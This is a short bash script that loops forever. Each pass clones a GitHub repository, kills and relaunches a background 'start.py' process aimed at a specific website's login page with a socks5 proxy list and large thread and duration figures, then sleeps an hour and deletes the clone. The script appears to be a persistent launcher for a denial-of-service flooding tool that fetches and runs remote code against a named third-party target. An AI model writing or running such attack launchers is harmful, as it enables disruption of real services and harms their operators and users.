#!/bin/bash
sleep_time=3600
sleep2_time=60
while :
do
  git clone https://github.com/TryAgainC/files.git
  sleep $sleep2_time
  pid=`ps -aux |grep "python3 start.py null https://goii.art/#/login 1 30000 socks5.txt 10000 854854"|grep -v "grep" |awk '{print $2}'`
  kill -9 $pid
  nohup python3 start.py null https://goii.art/#/login 1 30000 socks5.txt 10000 854854 >> /dev/null 2>&1 &
  sleep $sleep_time
  rm -rf files
done
